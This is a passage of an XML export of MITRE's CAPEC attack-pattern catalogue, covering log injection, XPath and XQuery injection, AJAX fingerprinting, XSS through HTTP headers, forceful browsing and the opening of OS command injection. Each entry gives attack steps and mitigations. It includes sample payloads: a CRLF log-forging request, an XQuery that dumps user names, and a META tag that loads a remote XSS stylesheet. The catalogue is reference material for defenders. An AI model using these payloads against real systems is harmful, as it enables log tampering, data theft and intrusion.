                  <xhtml:p>Indirectly through injection, use carriage return and/or line feed characters to start a new line in the log file, and then, add a fake entry.</xhtml:p>
                  <xhtml:p>For example: The HTTP request for "/index.html%0A%0DIP_ADDRESS- - DATE_FORMAT] "GET /forged-path HTTP/1.1" 200 - "-" USER_AGENT" may add the log line into Apache "access_log" (for example). Different applications may require different encodings of the carriage return and line feed characters.</xhtml:p>
               </Technique>
               <Technique>
                  <xhtml:p>Directly through log file or database manipulation, use carriage return and/or line feed characters to start a new line in the log file, and then, add a fake entry.</xhtml:p>
                  <xhtml:p>For example: The HTTP request for "/index.html%0A%0DIP_ADDRESS- - DATE_FORMAT] "GET /forged-path HTTP/1.1" 200 - "-" USER_AGENT" may add the log line into Apache "access_log" (for example). Different applications may require different encodings of the carriage return and line feed characters.</xhtml:p>
               </Technique>
               <Technique>Directly through log file or database manipulation, modify existing log entries.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>Target server software must be a HTTP server that performs web logging.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">To input faked entries into Web logs</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>Ability to send specially formatted HTTP request to web server</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Design: Use input validation before writing to web log</Mitigation>
            <Mitigation>Design: Validate all log data before it is output</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>Most web servers have a public interface, even if the majority of the site is password protected, there is usually at least a login site and brochureware that is publicly available. HTTP requests to the site are also generally logged to a Web log. From an attacker point of view, standard HTTP requests containing a malicious payload can be sent to the public website (with no other access required), when those requests appear in the log (such as http://victimsite/index.html?&lt; malicious script&gt; if they are followed by an administrator this may be sufficient to probe the administrator's host or local network.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="117"/>
            <Related_Weakness CWE_ID="93"/>
            <Related_Weakness CWE_ID="75"/>
            <Related_Weakness CWE_ID="221"/>
            <Related_Weakness CWE_ID="96"/>
            <Related_Weakness CWE_ID="20"/>
            <Related_Weakness CWE_ID="150"/>
            <Related_Weakness CWE_ID="276"/>
            <Related_Weakness CWE_ID="279"/>
            <Related_Weakness CWE_ID="116"/>
            <Related_Weakness CWE_ID="713"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="83" Name="XPath Injection" Abstraction="Detailed" Status="Draft">
         <Description>An attacker can craft special user-controllable input consisting of XPath expressions to inject the XML database and bypass authentication or glean information that he normally would not be able to. XPath Injection enables an attacker to talk directly to the XML database, thus bypassing the application completely. XPath Injection results from the failure of an application to properly sanitize input used as part of dynamic XPath expressions used to query an XML database.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="250"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Survey the target] Using a browser or an automated tool, an attacker records all instances of user-controllable input used to contruct XPath queries.</Description>
               <Technique>Use an automated tool to record all instances of user-controllable input used to contruct XPath queries.</Technique>
               <Technique>Use a browser to manually explore the website and analyze how the application processes inputs.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Explore</Phase>
               <Description>[Determines the structure of queries] Using manual or automated means, query inputs found for XPath weaknesses.</Description>
               <Technique>Use an automated tool automatically probe the inputs for XPath weaknesses.</Technique>
               <Technique>Manually probe the inputs using characters such as single quote (') that can cause XPath-releated errors, thus indicating an XPath weakness.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Exploit the target] Craft malicious content containing XPath expressions that is not validated by the application and is executed as part of the XPath queries.</Description>
               <Technique>Use the crafted input to execute unexpected queries that can disclose sensitive database information to the attacker.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>XPath queries used to retrieve information stored in XML documents</Prerequisite>
            <Prerequisite>User-controllable input not properly sanitized before being used as part of XPath queries</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">XPath Injection shares the same basic premises with SQL Injection. An attacker must have knowledge of XPath syntax and constructs in order to successfully leverage XPath Injection</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Indicators>
            <Indicator>Too many exceptions generated by the application as a result of malformed XPath queries</Indicator>
         </Indicators>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as content that can be interpreted in the context of an XPath expression. Characters such as a single-quote(') or operators such as or (|), and (&amp;) and such should be filtered if the application does not expect them in the context in which they appear. If such content cannot be filtered, it must at least be properly escaped to avoid them being interpreted as part of XPath expressions.</Mitigation>
            <Mitigation>Use of parameterized XPath queries - Parameterization causes the input to be restricted to certain domains, such as strings or integers, and any input outside such domains is considered invalid and the query fails.</Mitigation>
            <Mitigation>Use of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the database or application.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>Consider an application that uses an XML database to authenticate its users. The application retrieves the user name and password from a request and forms an XPath expression to query the database. An attacker can successfully bypass authentication and login without valid credentials through XPath Injection. This can be achieved by injecting the query to the XML database with XPath syntax that causes the authentication check to fail. Improper validation of user-controllable input and use of a non-parameterized XPath expression enable the attacker to inject an XPath expression that causes authentication bypass.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="91"/>
            <Related_Weakness CWE_ID="74"/>
            <Related_Weakness CWE_ID="20"/>
            <Related_Weakness CWE_ID="713"/>
            <Related_Weakness CWE_ID="707"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Phases, Description Summary, Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References, Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="84" Name="XQuery Injection" Abstraction="Detailed" Status="Draft">
         <Description>This attack utilizes XQuery to probe and attack server systems; in a similar manner that SQL Injection allows an attacker to exploit SQL calls to RDBMS, XQuery Injection uses improperly validated data that is passed to XQuery commands to traverse and execute commands that the XQuery routines have access to. XQuery injection can be used to enumerate elements on the victim's environment, inject commands to the local host, or execute queries to remote files and data sources.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="250"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Survey the application for user-controllable inputs] Using a browser or an automated tool, an attacker follows all public links and actions on a web site. He records all the links, the forms, the resources accessed and all other potential entry-points for the web application.</Description>
               <Technique>Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.</Technique>
               <Technique>Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.</Technique>
               <Technique>Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Determine user-controllable input susceptible to injection] Determine the user-controllable input susceptible to injection. For each user-controllable input that the attacker suspects is vulnerable to XQL injection, attempt to inject characters that have special meaning in XQL. The goal is to create an XQL query with an invalid syntax.</Description>
               <Technique>Use web browser to inject input through text fields or through HTTP GET parameters.</Technique>
               <Technique>Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, etc.</Technique>
               <Technique>Use XML files to inject input.</Technique>
               <Technique>Use network-level packet injection tools such as netcat to inject input</Technique>
               <Technique>Use modified client (modified by reverse engineering) to inject input.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Information Disclosure] The attacker crafts and injects an XQuery payload which is acted on by an XQL query leading to inappropriate disclosure of information.</Description>
               <Technique>Leveraging one of the vulnerable inputs identified during the Experiment phase, inject malicious XQuery payload. The payload aims to get information on the structure of the underlying XML database and/or the content in it.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Exploit</Phase>
               <Description>[Manipulate the data in the XML database] The attacker crafts and injects an XQuery payload which is acted on by an XQL query leading to modification of application data.</Description>
               <Technique>Leveraging one of the vulnerable inputs identified during the Experiment phase, inject malicious XQuery payload.. The payload tries to insert or replace data in the XML database.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The XQL must execute unvalidated data</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">Basic understanding of XQuery</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Design: Perform input white list validation on all XML input</Mitigation>
            <Mitigation>Implementation: Run xml parsing and query infrastructure with minimal privileges so that an attacker is limited in their ability to probe other system resources from XQL.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>An attacker can pass XQuery expressions embedded in otherwise standard XML documents. Like SQL injection attacks, the attacker tunnels through the application entry point to target the resource access layer. The string below is an example of an attacker accessing the accounts.xml to request the service provider send all user names back.</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">doc(accounts.xml)//user[Name='*']</xhtml:div>
               <xhtml:p>The attacks that are possible through XQuery are difficult to predict, if the data is not validated prior to executing the XQL.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="74"/>
            <Related_Weakness CWE_ID="713"/>
            <Related_Weakness CWE_ID="707"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="85" Name="AJAX Fingerprinting" Abstraction="Detailed" Status="Draft">
         <Description>This attack utilizes the frequent client-server roundtrips in Ajax conversation to scan a system. While Ajax does not open up new vulnerabilities per se, it does optimize them from an attacker point of view. In many XSS attacks the attacker must get a "hole in one" and successfully exploit the vulnerability on the victim side the first time, once the client is redirected the attacker has many chances to engage in follow on probes, but there is only one first chance. In a widely used web application this is not a major problem because 1 in a 1,000 is good enough in a widely used application. A common first step for an attacker is to footprint the environment to understand what attacks will work. Since footprinting relies on enumeration, the conversational pattern of rapid, multiple requests and responses that are typical in Ajax applications enable an attacker to look for many vulnerabilities, well-known ports, network locations and so on.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="541"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The user must allow JavaScript to execute in their browser</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">To land and launch a script on victim's machine with appropriate footprinting logic for enumerating services and vulnerabilities in JavaScript</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Design: Use browser technologies that do not allow client side scripting.</Mitigation>
            <Mitigation>Design: Utilize strict type, character, and encoding enforcement</Mitigation>
            <Mitigation>Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.</Mitigation>
            <Mitigation>Implementation: Perform input validation for all remote content.</Mitigation>
            <Mitigation>Implementation: Perform output validation for all remote content.</Mitigation>
            <Mitigation>Implementation: Disable scripting languages such as JavaScript in browser</Mitigation>
            <Mitigation>Implementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>Footprinting can be executed over almost any protocol including HTTP, TCP, UDP, and ICMP, with the general goal of gaining further information about a host environment to launch further attacks. By appending a malicious script to an otherwise normal looking URL, the attacker can probe the system for banners, vulnerabilities, filenames, available services, and in short anything the host process has access to. The results of the probe are either used to execute additional javascript (for example, if the attackers' footprint script identifies a vulnerability in a firewall permission, then the client side script executes a javascript to change client firewall settings, or an attacker may simply echo the results of the scan back out to a remote host for targeting future attacks).</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="79"/>
            <Related_Weakness CWE_ID="113"/>
            <Related_Weakness CWE_ID="348"/>
            <Related_Weakness CWE_ID="96"/>
            <Related_Weakness CWE_ID="20"/>
            <Related_Weakness CWE_ID="116"/>
            <Related_Weakness CWE_ID="184"/>
            <Related_Weakness CWE_ID="86"/>
            <Related_Weakness CWE_ID="712"/>
            <Related_Weakness CWE_ID="692"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-539"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="86" Name="XSS Through HTTP Headers" Abstraction="Detailed" Status="Draft">
         <Description>An adversary exploits web applications that generate web content, such as links in a HTML page, based on unvalidated or improperly validated data submitted by other actors. XSS in HTTP Headers attacks target the HTTP headers which are hidden from most users and may not be validated by web applications.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="591"/>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="588"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Spider] Using a browser or an automated tool, an attacker follows all public links on a web site. He records all the entry points (input) that becomes part of generated HTTP header (not only GET/POST/COOKIE, but also Content-Type, etc.)</Description>
               <Technique>Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters used in the HTTP headers.</Technique>
               <Technique>Look for HTML meta tags that could be injectable</Technique>
               <Technique>Use a proxy tool to record all links visited during a manual traversal of the web application.</Technique>
               <Technique>Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Probe identified potential entry points for XSS vulnerability]<xhtml:p>The attacker uses the entry points gathered in the "Explore" phase as a target list and injects various common script payloads to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited. He records all the responses from the server that include unmodified versions of his script.</xhtml:p>
                  <xhtml:p>The attacker tries also to inject extra-parameter to the HTTP request to see if they are reflected back in the web page or in the HTTP response.</xhtml:p>
               </Description>
               <Technique>Manually inject various script payloads into each identified entry point using a list of common script injection probes and observe system behavior to determine if script was executed.</Technique>
               <Technique>Use an automated injection attack tool to inject various script payloads into each identified entry point using a list of common script injection probes and observe system behavior to determine if script was executed.</Technique>
               <Technique>Use a proxy tool to record results of manual input of XSS probes in known URLs.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Steal session IDs, credentials, page content, etc.] As the attacker succeeds in exploiting the vulnerability, he can choose to steal user's credentials in order to reuse or to analyze them later on.</Description>
               <Technique>Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and sends document information to the attacker.</Technique>
               <Technique>Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute appropriately.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Exploit</Phase>
               <Description>[Forceful browsing] When the attacker targets the current application or another one (through CSRF vulnerabilities), the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws, but it can also be used to create a widespread attack against a particular website on the user's current network (Internet or not).</Description>
               <Technique>Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and performs actions on the same web site</Technique>
               <Technique>Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities).</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>5</Step>
               <Phase>Exploit</Phase>
               <Description>[Content spoofing] By manipulating the content, the attacker targets the information that the user would like to get from the website.</Description>
               <Technique>Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and exposes attacker-modified invalid information to the user on the current web page.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>Target software must be a client that allows scripting communication from remote hosts.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">To achieve a redirection and use of less trusted source, an attacker can simply edit HTTP Headers that are sent to client machine.</Skill>
            <Skill Level="High">Exploiting a client side vulnerability to inject malicious scripts into the browser's executable process.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>The adversary must have the ability to deploy a custom hostile service for access by targeted clients and the abbility to communicate synchronously or asynchronously with client machine. The adversary must also control a remote site of some sort to redirect client and data to.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Design: Use browser technologies that do not allow client side scripting.</Mitigation>
            <Mitigation>Design: Utilize strict type, character, and encoding enforcement</Mitigation>
            <Mitigation>Design: Server side developers should not proxy content via XHR or other means, if a http proxy for remote content is setup on the server side, the client's browser has no way of discerning where the data is originating from.</Mitigation>
            <Mitigation>Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.</Mitigation>
            <Mitigation>Implementation: Perform input validation for all remote content.</Mitigation>
            <Mitigation>Implementation: Perform output validation for all remote content.</Mitigation>
            <Mitigation>Implementation: Disable scripting languages such as JavaScript in browser</Mitigation>
            <Mitigation>Implementation: Session tokens for specific host</Mitigation>
            <Mitigation>Implementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>Utilize a remote style sheet set in the HTTP header for XSS attack. When the attacker is able to point to a remote stylesheet, any of the variables set in that stylesheet are controllable on the client side by the remote attacker. Like most XSS attacks, results vary depending on browser that is used.</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="attack">&lt;META HTTP-EQUIV="Link" Content="&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet"&gt;</xhtml:div>
               <xhtml:p>[R.86.2]</xhtml:p>
            </Example>
            <Example>
               <xhtml:p>Google's 404 redirection script was found vulnerable to this attack vector.</xhtml:p>
               <xhtml:p>Google's 404 file not found page read</xhtml:p>
               <xhtml:p>* Response headers: "Content-Type: text/html; charset=[encoding]".</xhtml:p>
               <xhtml:p>* Response body: &lt;META http-equiv="Content-Type" (...) charset=[encoding]/&gt;</xhtml:p>
               <xhtml:p>If the response sends an unexpected encoding type such as UTF-7, then no enforcement is done on the payload and arbitrary XSS code will be transported along with the standard HTTP response. [R.86.3]</xhtml:p>
            </Example>
            <Example>XSS can be used in variety of ways, because it is scripted and executes in a distributed, asynchronous fashion it can create its own vector and openings. For example, the attacker can use XSS to mount a DDoS attack by having series of different computers unknowingly executing requests against a single host.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="80"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
            <Reference External_Reference_ID="REF-97" Section="XSS Filter Evasion Cheat Sheet"/>
            <Reference External_Reference_ID="REF-476"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Prerequisites, Description Summary, Related_Attack_Patterns, Related_Weaknesses, Resources_Required</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2017-05-01">Embedding Script (XSS) in HTTP Headers</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="87" Name="Forceful Browsing" Abstraction="Standard" Status="Draft">
         <Description>An attacker employs forceful browsing to access portions of a website that are otherwise unreachable through direct URL entry. Usually, a front controller or similar design pattern is employed to protect access to portions of a web application. Forceful browsing enables an attacker to access information, perform privileged operations and otherwise reach sections of the web application that have been improperly protected.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="115"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Spider] Using an automated tool, an attacker follows all public links on a web site. He records all the links he finds.</Description>
               <Technique>Use a spidering tool to follow and record all links.</Technique>
               <Technique>Use a proxy tool to record all links visited during a manual traversal of the web application.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Attempt well-known or guessable resource locations] Using an automated tool, an attacker requests a variety of well-known URLs that correspond to administrative, debugging, or other useful internal actions. He records all the positive responses from the server.</Description>
               <Technique>Use a spidering tool to follow and record attempts on well-known URLs.</Technique>
               <Technique>Use a proxy tool to record all links visited during a manual traversal of attempts on well-known URLs.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Use unauthorized resources] By visiting the unprotected resource, the attacker makes use of unauthorized functionality.</Description>
               <Technique>Access unprotected functions and execute them.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Exploit</Phase>
               <Description>[View unauthorized data] The attacker discovers and views unprotected sensitive data.</Description>
               <Technique>Direct request of protected pages that directly access database back-ends. (e.g., list.jsp, accounts.jsp, status.jsp, etc.)</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The forcibly browseable pages or accessible resources must be discoverable and improperly protected.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">Forcibly browseable pages can be discovered by using a number of automated tools. Doing the same manually is tedious but by no means difficult.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack. A directory listing is helpful, but not a requirement.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Authenticate request to every resource. In addition, every page or resource must ensure that the request it is handling has been made in an authorized context.</Mitigation>
            <Mitigation>Forceful browsing can also be made difficult to a large extent by not hard-coding names of application pages or resources. This way, the attacker cannot figure out, from the application alone, the resources available from the present context.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>A bulletin board application provides an administrative interface at admin.aspx when the user logging in belongs to the administrators group.</xhtml:p>
               <xhtml:p>An attacker can access the admin.aspx interface by making a direct request to the page. Not having access to the interface appropriately protected allows the attacker to perform administrative functions without having to authenticate himself in that role.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="425"/>
            <Related_Weakness CWE_ID="285"/>
            <Related_Weakness CWE_ID="693"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns, Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Phases, Attacker_Skills_or_Knowledge_Required, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="88" Name="OS Command Injection" Abstraction="Standard" Status="Draft">
         <Description>In this type of an attack, an adversary injects operating system commands into existing application functions. An application that uses untrusted input to build command strings is vulnerable. An adversary can leverage OS command injection in an application to elevate privileges, execute arbitrary commands and compromise the underlying operating system.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="248"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Identify inputs for OS commands] The attacker determines user controllable input that gets passed as part of a command to the underlying operating system.</Description>
               <Technique>Port mapping. Identify ports that the system is listening on, and attempt to identify inputs and protocol types on those ports.</Technique>
               <Technique>TCP/IP Fingerprinting. The attacker uses various software to make connections or partial connections and observe idiosyncratic responses from the operating system. Using those responses, he attempts to guess the actual operating system.</Technique>
               <Technique>Induce errors to find informative error messages</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Explore</Phase>
               <Description>[Survey the Application] The attacker surveys the target application, possibly as a valid and authenticated user</Description>
               <Technique>Spidering web sites for all available links</Technique>
               <Technique>Inventory all application inputs</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Experiment</Phase>
               <Description>[Vary inputs, looking for malicious results.] Depending on whether the application being exploited is a remote or local one the attacker crafts the appropriate malicious input, containing OS commands, to be passed to the application</Description>
